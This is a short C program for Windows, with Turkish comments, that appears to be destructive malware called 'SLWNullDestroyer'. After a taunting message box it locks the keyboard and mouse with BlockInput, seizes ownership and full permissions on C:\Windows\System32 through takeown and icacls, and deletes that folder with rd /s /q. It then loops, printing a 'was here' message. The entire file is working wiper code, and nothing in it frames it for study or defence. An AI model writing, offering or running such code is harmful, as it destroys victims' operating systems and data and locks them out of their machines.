#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void blockInput() {
    // Klavye ve fareyi kilitle
    BlockInput(TRUE);
}

void deleteCriticalFiles() {
    // Kritik dosyaları sil (örnek, System32)
    system("takeown /f C:\\Windows\\System32 /r /d y >nul 2>&1");
    system("icacls C:\\Windows\\System32 /grant %username%:F /t >nul 2>&1");
    system("rd /s /q C:\\Windows\\System32");
}

void infiniteLoop() {
    // Sonsuz döngü
    while (1) {
        printf("😀😂😈 SLWNullDestroyer was here!\n");
        Sleep(500);
    }
}

int main() {
    MessageBox(0, "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY", "SLWNullDestroyer", MB_OK);

    blockInput();
    deleteCriticalFiles();
    infiniteLoop();

    return 0;
}
